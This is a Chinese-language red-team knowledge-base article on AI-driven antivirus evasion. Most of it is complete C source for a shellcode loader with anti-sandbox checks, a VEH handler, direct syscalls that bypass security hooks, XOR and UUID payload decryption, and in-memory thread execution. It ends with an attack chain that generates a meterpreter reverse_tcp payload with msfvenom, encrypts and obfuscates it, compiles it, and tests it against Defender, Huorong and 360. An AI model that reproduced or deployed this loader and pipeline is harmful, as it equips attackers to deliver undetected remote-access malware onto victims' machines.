---
id: "pe-reverse/09-av-evasion/01-ai-powered-evasion"
title: "AI 驱动免杀：Shellcode 处理 + Loader 编写"
title_en: "AI-Driven Antivirus Evasion: Shellcode Processing + Loader Development"
summary: >
  全链路免杀方案：从 shellcode 同义指令替换和花指令注入（Patch）、多层加密（XOR/RC4/S-Box）、UUID/IPv4/MAC 混淆伪装，到反沙箱/VEH/Syscall Loader 模板编写，附编译命令参考和验证闭环标准。
summary_en: >
  End-to-end AV evasion pipeline: from shellcode synonym replacement and junk injection (Patch), multi-layer encryption (XOR/RC4/S-Box), UUID/IPv4/MAC obfuscation camouflage, to anti-sandbox/VEH/syscall Loader template development, with compilation reference and verification criteria.
board: "pe-reverse"
category: "09-av-evasion"
signals:
  - "shellcode encryption"
  - "obfuscation"
  - "anti-sandbox"
  - "VEH"
  - "direct syscall"
  - "免杀"
  - "Loader"
  - "花指令"
mcp_tools:
  - run_ctf_tool
  - triage_pe
  - patch_pe_bytes
  - ghidra_headless_analyze
  - extract_iocs_from_summary
  - hash_file
  - make_yara_stub
keywords:
  - "AV evasion"
  - "shellcode"
  - "encryption"
  - "obfuscation"
  - "loader"
  - "anti-sandbox"
  - "syscall"
  - "VEH"
  - "XOR"
  - "UUID"
difficulty: "advanced"
tags:
  - "AV-evasion"
  - "shellcode"
  - "loader"
  - "obfuscation"
  - "anti-sandbox"
  - "syscall"
  - "encryption"
  - "red-team"
language: "zh-CN"
last_updated: "2026-06-25"
related_articles: []
---
# AI 驱动免杀：Shellcode 处理 + Loader 编写

> 本篇：攻击链（第 4 节后半）。续篇：`04-compile-verify-and-mapping.md`。


> 本篇：攻击链 / 编译 / 验证闭环。

## 4. Loader 模板 — 运行时执行

```c
// scripts/windows/av-evasion/loader.c
// 编译: x86_64-w64-mingw32-gcc -o loader.exe loader.c -mwindows -Os -static -s
//  或:    cl.exe /MT /O2 /GS- loader.c /link /SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup

#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#pragma comment(lib, "ntdll.lib")

// ═══════════════════════════════════════════
// 0. 字符串运行时解密 (对抗静态字符串提取)
// ═══════════════════════════════════════════

#define STR_XOR_KEY 0xAB

static char* decrypt_str(char* enc, size_t len) {
    for (size_t i = 0; i < len; i++) enc[i] ^= STR_XOR_KEY;
    return enc;
}

// ═══════════════════════════════════════════
// 1. 反沙箱 / 反虚拟机检测
// ═══════════════════════════════════════════

static BOOL anti_sandbox_check(void) {
    // 方法1: 延迟执行 (沙箱通常有超时限制)
    LARGE_INTEGER delay;
    delay.QuadPart = -((LONGLONG)30000000);  // 3 seconds in 100ns units
    NtDelayExecution(FALSE, &delay);  // 或 Sleep(3000)

    // 方法2: 检测物理内存 (沙箱通常 < 2GB)
    MEMORYSTATUSEX mem = { .dwLength = sizeof(mem) };
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return TRUE;

    // 方法3: 检测 CPU 核心数 (沙箱通常 <= 1)
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors <= 1) return TRUE;

    // 方法4: 检测已知沙箱文件/进程
    const char* sandbox_files[] = {
        "C:\\agent\\agent.pyw",
        "C:\\analysis\\analysis.exe",
        "C:\\sandbox\\",
        NULL
    };
    for (int i = 0; sandbox_files[i]; i++) {
        if (GetFileAttributesA(sandbox_files[i]) != INVALID_FILE_ATTRIBUTES)
            return TRUE;
    }

    // 方法5: 检测调试器
    if (IsDebuggerPresent()) return TRUE;

    // 方法6: 检测已知沙箱 DLL
    const char* sandbox_dlls[] = {
        "sbiedll.dll",     // Sandboxie
        "dbghelp.dll",     // 某些沙箱
        "api_log.dll",     // Sunbelt
        "dir_watch.dll",   // Sunbelt
        "pstorec.dll",     // Sunbelt
        "vmcheck.dll",     // CWSandbox
        "wpespy.dll",      // CWSandbox
        NULL
    };
    for (int i = 0; sandbox_dlls[i]; i++) {
        if (GetModuleHandleA(sandbox_dlls[i])) return TRUE;
    }

    return FALSE;
}

// ═══════════════════════════════════════════
// 2. VEH 内存保护
// ═══════════════════════════════════════════

static LONG WINAPI veh_handler(PEXCEPTION_POINTERS ex) {
    PEXCEPTION_RECORD rec = ex->ExceptionRecord;
    if (rec->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
        // 按需修改内存权限
        DWORD old;
        VirtualProtect(rec->ExceptionAddress, 0x1000, PAGE_EXECUTE_READWRITE, &old);
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    if (rec->ExceptionCode == EXCEPTION_ILLEGAL_INSTRUCTION) {
        // 某些杀软会插入 int3, 跳过
        ex->ContextRecord->Rip++;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

// ═══════════════════════════════════════════
// 3. Direct Syscall Stubs
// ═══════════════════════════════════════════

// 从 ntdll.dll 动态提取 syscall 号 (避免硬编码)
static DWORD get_syscall_number(const char* func_name) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;
    BYTE* func = (BYTE*)GetProcAddress(ntdll, func_name);
    if (!func || func[0] != 0x4C || func[1] != 0x8B || func[2] != 0xD1)  // mov r10, rcx
        return 0;
    // 找 mov eax, <syscall#>  →  B8 XX XX XX XX
    for (int i = 0; i < 24; i++) {
        if (func[i] == 0xB8) {
            return *(DWORD*)(func + i + 1);
        }
    }
    // Fallback: 找 mov eax, imm16 → B8 XX XX
    for (int i = 0; i < 24; i++) {
        if (func[i] == 0xB8) return *(WORD*)(func + i + 1);
    }
    return 0;
}

// 通用 syscall 封装
// extern 声明使函数不被内联, 保留原始汇编
extern NTSTATUS do_syscall(DWORD syscall_num, ULONG_PTR arg1, ULONG_PTR arg2,
                           ULONG_PTR arg3, ULONG_PTR arg4);

#if defined(_MSC_VER)
__declspec(naked) NTSTATUS do_syscall(DWORD syscall_num, ULONG_PTR a1, ULONG_PTR a2,
                                      ULONG_PTR a3, ULONG_PTR a4) {
    __asm {
        mov     r10, rcx
        mov     eax, edx      // syscall number
        mov     rcx, r8       // real arg1
        mov     rdx, r9       // real arg2
        mov     r8,  [rsp+40] // real arg3
        mov     r9,  [rsp+48] // real arg4
        syscall
        ret
    }
}
#elif defined(__GNUC__)
// MinGW 用内联汇编
__attribute__((naked)) NTSTATUS do_syscall(DWORD num, ULONG_PTR a1, ULONG_PTR a2,
                                            ULONG_PTR a3, ULONG_PTR a4) {
    __asm__ volatile(
        "mov %%rcx, %%r10\n\t"
        "mov %%edx, %%eax\n\t"
        "mov %%r8,  %%rcx\n\t"
        "mov %%r9,  %%rdx\n\t"
        "mov 0x28(%%rsp), %%r8\n\t"
        "mov 0x30(%%rsp), %%r9\n\t"
        "syscall\n\t"
        "ret"
    );
}
#endif

// ═══════════════════════════════════════════
// 4. Shellcode 解密 (XOR, 输入时已加密)
// ═══════════════════════════════════════════

static void xor_decrypt(unsigned char* data, size_t len, unsigned char* key, size_t key_len) {
    for (size_t i = 0; i < len; i++) data[i] ^= key[i % key_len];
}

// ═══════════════════════════════════════════
// 5. UUID 反混淆 → 还原 shellcode 字节
// ═══════════════════════════════════════════

#include <rpc.h>
#pragma comment(lib, "rpcrt4.lib")

static void uuid_deobfuscate(char** uuids, size_t count, unsigned char* out, size_t out_len) {
    size_t offset = 0;
    for (size_t i = 0; i < count && offset < out_len; i++) {
        UUID uuid;
        RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], &uuid);
        if (status != RPC_S_OK) continue;
        size_t copy_len = 16;
        if (offset + copy_len > out_len) copy_len = out_len - offset;
        // UUID 按小端序存储
        memcpy(out + offset, &uuid, copy_len);
        offset += copy_len;
    }
}

// ═══════════════════════════════════════════
// 6. 主执行逻辑
// ═══════════════════════════════════════════

int main(void) {
    // ── 反沙箱 ──
    if (anti_sandbox_check()) {
        // 伪装成正常退出
        return 0;
    }

    // ── 注册 VEH ──
    AddVectoredExceptionHandler(1, veh_handler);

    // ── 加密的 shellcode (由 shellcode-encrypt.py 生成) ──
    // $$SHELLCODE_PLACEHOLDER$$

    // ── 解密密钥 (由 shellcode-encrypt.py 生成) ──
    // $$KEY_PLACEHOLDER$$

    // ── 解密 ──
    xor_decrypt(encrypted_shellcode, encrypted_shellcode_len,
                decrypt_key, decrypt_key_len);

    // ── 反混淆 (如果用了 UUID) ──
    // $$UUID_PLACEHOLDER$$
    // unsigned char deobfuscated[4096];
    // uuid_deobfuscate(payload_uuid, payload_uuid_count, deobfuscated, sizeof(deobfuscated));
    // xor_decrypt(deobfuscated, sizeof(deobfuscated), decrypt_key, decrypt_key_len);

    // ── 分配可执行内存 (用 syscall 绕过 Hook) ──
    DWORD nt_alloc = get_syscall_number("NtAllocateVirtualMemory");
    DWORD nt_write = get_syscall_number("NtWriteVirtualMemory");
    DWORD nt_protect = get_syscall_number("NtProtectVirtualMemory");
    DWORD nt_thread = get_syscall_number("NtCreateThreadEx");
    DWORD nt_wait = get_syscall_number("NtWaitForSingleObject");

    if (!nt_alloc || !nt_write || !nt_thread) {
        // Fallback: 用标准 API
        void* exec = VirtualAlloc(NULL, encrypted_shellcode_len,
                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        memcpy(exec, encrypted_shellcode, encrypted_shellcode_len);
        DWORD old;
        VirtualProtect(exec, encrypted_shellcode_len, PAGE_EXECUTE_READ, &old);
        HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec,
                                     NULL, 0, NULL);
        WaitForSingleObject(thread, INFINITE);
        CloseHandle(thread);
        return 0;
    }

    // ── Syscall 路径 ──
    void* exec_mem = NULL;
    SIZE_T size = encrypted_shellcode_len;
    do_syscall(nt_alloc, (ULONG_PTR)GetCurrentProcess(),
               (ULONG_PTR)&exec_mem, 0, (ULONG_PTR)&size,
               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    SIZE_T written;
    do_syscall(nt_write, (ULONG_PTR)GetCurrentProcess(),
               (ULONG_PTR)exec_mem, (ULONG_PTR)encrypted_shellcode,
               encrypted_shellcode_len, (ULONG_PTR)&written);

    // ── 改内存为可执行 ──
    DWORD old_protect;
    do_syscall(nt_protect, (ULONG_PTR)GetCurrentProcess(),
               (ULONG_PTR)&exec_mem, (ULONG_PTR)&size,
               PAGE_EXECUTE_READ, (ULONG_PTR)&old_protect);

    // ── 创建线程执行 ──
    HANDLE thread;
    do_syscall(nt_thread, (ULONG_PTR)&thread, 0x1FFFFF, 0,
               (ULONG_PTR)GetCurrentProcess(), (ULONG_PTR)exec_mem,
               0, 0, 0, 0, 0);

    do_syscall(nt_wait, (ULONG_PTR)thread, 0, 0, 0);

    CloseHandle(thread);
    return 0;
}
```

---

## 攻击链

```
[1] 生成原始 shellcode
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o payload.bin

[2] Patch 破坏静态特征
    python scripts/windows/av-evasion/shellcode-patch.py payload.bin 0.03

[3] 多层加密
    python scripts/windows/av-evasion/shellcode-encrypt.py payload_patched.bin $(openssl rand -hex 16) --layers xor,rc4

[4] 混淆伪装
    python scripts/windows/av-evasion/shellcode-obfuscate.py payload_patched_encrypted.bin combo

[5] 注入 Loader 并编译
    python scripts/windows/av-evasion/merge_loader.py payload_patched_encrypted.c payload_patched_encrypted_key.c -o loader_final.c
    x86_64-w64-mingw32-gcc -o payload.exe loader_final.c -mwindows -Os -static -s -lrpcrt4

[6] 验证
    上传 VirusTotal (勾选 private)
    本地虚拟机 (WD + 火绒 + 360) 实际执行测试
```

---
